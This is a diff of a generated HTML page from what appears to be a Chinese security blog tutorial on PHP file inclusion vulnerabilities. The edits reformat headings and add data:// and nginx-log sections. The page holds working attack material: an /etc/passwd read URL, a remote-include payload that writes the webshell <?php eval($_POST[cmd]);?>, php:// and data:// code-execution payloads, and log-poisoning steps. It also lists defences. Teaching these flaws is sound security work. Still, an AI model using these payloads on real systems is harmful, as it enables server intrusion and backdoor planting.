@@ -5,11 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="文件包含漏洞介绍, 白芨的小屋">
-    <meta name="description" content="文件包含原理​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。
+    <meta name="description" content="文件包含​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。
 
 注：其他语言也可能出现包含漏洞
 
-文件包含函">
+1、文件包含函">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -313,7 +313,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/include.jpeg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -472,7 +472,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.4k
                 </div>
                 
 
@@ -492,11 +492,11 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。</p>
+                <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。</p>
 <ul>
 <li><strong>注：其他语言也可能出现包含漏洞</strong></li>
 </ul>
-<h2 id="文件包含函数-PHP"><a href="#文件包含函数-PHP" class="headerlink" title="文件包含函数-PHP"></a>文件包含函数-PHP</h2><table>
+<h2 id="1、文件包含函数-PHP"><a href="#1、文件包含函数-PHP" class="headerlink" title="1、文件包含函数-PHP"></a>1、文件包含函数-PHP</h2><table>
 <thead>
 <tr>
 <th>php函数：</th>
@@ -520,7 +520,7 @@
 <td>与Require()语句类似，区别是若文件已被包涵则不会再次包含。</td>
 </tr>
 </tbody></table>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h4 id="漏洞示例：（无限制）"><a href="#漏洞示例：（无限制）" class="headerlink" title="漏洞示例：（无限制）"></a>漏洞示例：（无限制）</h4><p>在index.php中有如下代码：</p>
+<h2 id="2、本地文件包含"><a href="#2、本地文件包含" class="headerlink" title="2、本地文件包含"></a>2、本地文件包含</h2><h4 id="漏洞示例：（无限制）"><a href="#漏洞示例：（无限制）" class="headerlink" title="漏洞示例：（无限制）"></a>漏洞示例：（无限制）</h4><p>在index.php中有如下代码：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -533,38 +533,38 @@
 
 <p>与上述漏洞不同的是，服务端将所包含文件加后缀<code>.html</code>强制转换成html类型去执行。</p>
 <p>绕过方法：</p>
-<p>​    windows文件命名不超过256个字符，可使用<code>./</code>进行垃圾字符填充，使.html没有空间写入文件名中。</p>
+<p>​    windows文件命名不超过256个字符，可使用<code>./</code>进行<strong>垃圾字符填充</strong>，使.html没有空间写入文件名中。</p>
 <p>长度截断：windows,点号长于256，linux长于4096</p>
-<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>​    在php语言中，若使用远程文件包含，首先确定php是否开启远程文件包含功能：allow_url_include = On</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">allow_url_fopen <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//默认开启</span>
-allow_url_fopen <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span>
-allow_url_include <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//php 5.2以后添加,安全方便的设置(默认关闭)</span>
-allow_url_include <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="3、远程文件包含"><a href="#3、远程文件包含" class="headerlink" title="3、远程文件包含"></a>3、远程文件包含</h2><p>​    在php语言中，若使用远程文件包含，首先确定php是否开启远程文件包含功能：allow_url_include = On</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">allow_url_fopen <span class="token operator">=</span> <span class="token function">On</span>		<span class="token punctuation">(</span>允许打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//默认开启</span>
+allow_url_fopen <span class="token operator">=</span> <span class="token function">Off</span>		<span class="token punctuation">(</span>禁止打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span>
+allow_url_include <span class="token operator">=</span> <span class="token function">Off</span>	<span class="token punctuation">(</span>禁止引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//php 5.2以后添加,安全方便的设置(默认关闭)</span>
+allow_url_include <span class="token operator">=</span> <span class="token function">On</span>	<span class="token punctuation">(</span>允许引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p><strong>前提：</strong></p>
+<h2 id="4、文件包含漏洞利用："><a href="#4、文件包含漏洞利用：" class="headerlink" title="4、文件包含漏洞利用："></a>4、文件包含漏洞利用：</h2><p><strong>前提：</strong></p>
 <ol>
 <li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li>
 <li>用户能够控制该动态变量。</li>
 </ol>
-<h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><em><strong>目标主机文件存在，且有相应权限</strong></em></p>
-<h3 id="2、远程包含shell"><a href="#2、远程包含shell" class="headerlink" title="2、远程包含shell"></a>2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p>
-<p>示例：</p>
-<p>个人服务器地址:<strong><a target="_blank" rel="noopener" href="http://twowards.top/">http://twowards.top</a></strong></p>
-<p>在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p>
+<h3 id="4-1、读取敏感文件"><a href="#4-1、读取敏感文件" class="headerlink" title="4.1、读取敏感文件"></a>4.1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><em><strong>目标主机文件存在，且有相应权限</strong></em></p>
+<h3 id="4-2、远程包含shell"><a href="#4-2、远程包含shell" class="headerlink" title="4.2、远程包含shell"></a>4.2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p>
+<p>示例：个人服务器地址:<strong><a target="_blank" rel="noopener" href="http://twowards.top/">http://twowards.top</a></strong>步骤：</p>
+<p>（1）在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fputs(fopen("shell.php","w"),"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>")</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<ul>
-<li><p>代码解析：</p>
-</li>
-<li><p>fputs(要写入的打开文件,写入的字符串内容)</p>
-</li>
-<li><p>fopen(规定要打开的文件，访问此文件的类型，此处为写入w)</p>
-</li>
-</ul>
-<p>访问<code>http://www.xxx.com/index.php?filname=http://twowards.top/echo.txt</code>，将会在index.php所在目录生成木马文件shell.php<code>&lt;?php eval($_POST[cmd]);?&gt;</code></p>
-<h3 id="3、本地包含配合文件上传"><a href="#3、本地包含配合文件上传" class="headerlink" title="3、本地包含配合文件上传"></a>3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p>
+<p>（2）<strong>代码解析：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">fputs					<span class="token comment">//要写入的打开文件,写入的字符串内容</span>
+
+fopen					<span class="token comment">//规定要打开的文件，访问此文件的类型，此处为写入w</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>（3）<strong>Payload</strong>：在<code>index.php</code>所在目录生成木马文件<code>shell.php：&lt;?php eval($_POST[cmd]);?&gt;</code></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?filname&#x3D;http:&#x2F;&#x2F;twowards.top&#x2F;echo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="4-3、本地包含配合文件上传"><a href="#4-3、本地包含配合文件上传" class="headerlink" title="4.3、本地包含配合文件上传"></a>4.3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p>
 <p><em><strong>直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。</strong></em></p>
-<h3 id="4、php伪协议"><a href="#4、php伪协议" class="headerlink" title="4、php伪协议"></a>4、php伪协议</h3><p>以参数为filename示例：</p>
+<h3 id="4-4、php伪协议"><a href="#4-4、php伪协议" class="headerlink" title="4.4、php伪协议"></a>4.4、php伪协议</h3><p>以参数为<code>filename</code>示例：</p>
 <table>
 <thead>
 <tr>
@@ -575,22 +575,29 @@ allow_url_include <span class="token operator">=</span> <span class="token funct
 </thead>
 <tbody><tr>
 <td>file://</td>
-<td>?filename=file://绝对路径</td>
+<td><code>?filename=file://绝对路径</code></td>
 <td>访问本地文件系统</td>
 </tr>
 <tr>
 <td>php://filter</td>
-<td>?filename=filter/read=convert.base64-encode/resource=xxx.php</td>
+<td><code>?filename=filter/read=convert.base64-encode/resource=xxx.php</code></td>
 <td>读取源码（此处读取到base64加密后的源码）</td>
 </tr>
 <tr>
 <td>php://input</td>
-<td>?filename=php://input【POST DATA】<?php phpinfo()?></td>
-<td>执行php代码。前提：allow_url_include=on</td>
+<td><code>?filename=php://input【POST DATA】&lt;?php phpinfo()?&gt;</code></td>
+<td>执行php代码。<br>allow_url_include=on</td>
+</tr>
+<tr>
+<td>data://</td>
+<td><code>?filename=data://text/plain,&lt;?php  phpinfo();?&gt;</code></td>
+<td>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。allow_url_include=on<br>allow_url_fopen=on</td>
 </tr>
 </tbody></table>
-<p>补充：php://input 用post提交php代码时，可提交<code>&lt;?php system(&#39;xxx&#39;)?&gt;</code>来执行系统命令。如：<code>&lt;?php system(&#39;net user&#39;)?&gt;</code>查看用户</p>
-<h3 id="5、包含apache日志文件"><a href="#5、包含apache日志文件" class="headerlink" title="5、包含apache日志文件"></a>5、包含apache日志文件</h3><p>当php文件存在本地包含漏洞时，却无法上传文件时，导致无法深度利用。Apache日志文件也是另一种思路。</p>
+<p><strong>补充</strong>：php://input 用post提交php代码时，可提交<code>&lt;?php system(&#39;xxx&#39;)?&gt;</code>来执行系统命令。如：<code>&lt;?php system(&#39;net user&#39;)?&gt;</code>查看 用户</p>
+<h3 id="4-5、包含nginx日志文件"><a href="#4-5、包含nginx日志文件" class="headerlink" title="4.5、包含nginx日志文件"></a>4.5、包含nginx日志文件</h3><p>Nginx日志文件默认路径：<code>/var/log/nginx/access.log</code>,记录了访问时间与<strong>UA</strong>信息。</p>
+<p>利用日志记录UA特性，将后门代码写在UA头中进行访问。</p>
+<h3 id="4-6、包含apache日志文件"><a href="#4-6、包含apache日志文件" class="headerlink" title="4.6、包含apache日志文件"></a>4.6、包含apache日志文件</h3><p>当php文件存在本地包含漏洞时，却无法上传文件时，导致无法深度利用。Apache日志文件也是另一种思路。</p>
 <p>前提：可找到Apache日志路径</p>
 <p>原理：</p>
 <p>Apache运行后通常默认生成两个日志文件access.log（访问日志），error.log（错误日志）。access.log记录了客户端每次请求服务器响应的相关信息。当访问资源不存在时，同样也会记录。</p>
@@ -600,11 +607,11 @@ allow_url_include <span class="token operator">=</span> <span class="token funct
 <p><code>127.0.0.1 - - [19/Nov/2021:15:00:00 +0800] &quot;GET /%3C?php%20phpinfo();%3E&quot;</code></p>
 <p>可以看到php中的<code>&lt; &gt;空格</code>被浏览器进行了转码。</p>
 <p>此时攻击者可利用BurpSuite来绕过编码，之后使用包含漏洞来包含access.log，去执行其中php代码。</p>
-<p>补充：安全起见，Apache安装时尽量不要使用默认路径。</p>
-<h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>1、严格控制包含中参数是否外部可控。</p>
+<p><strong>补充：安全起见，Apache安装时尽量不要使用默认路径。</strong></p>
+<h2 id="5、防御："><a href="#5、防御：" class="headerlink" title="5、防御："></a>5、防御：</h2><p>1、严格控制包含中参数是否外部可控。</p>
 <p>2、路径限制：限制被包含文件只能在某一文件夹内，禁止目录跳转字符。如<code>./</code>。</p>
 <p>3、包含验证：被包含文件是否在白名单中。</p>
-<p>4、尽量不使用动态包含，固定包含文件如：include(“head.php”);。</p>
+<p>4、尽量不使用动态包含，固定包含文件如：<code>include(&quot;head.php&quot;);</code>。</p>
 
                 
             </div>
@@ -1359,7 +1366,7 @@ allow_url_include <span class="token operator">=</span> <span class="token funct
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">37.6k</span>
+                        class="white-color">38.4k</span>
             
             
             
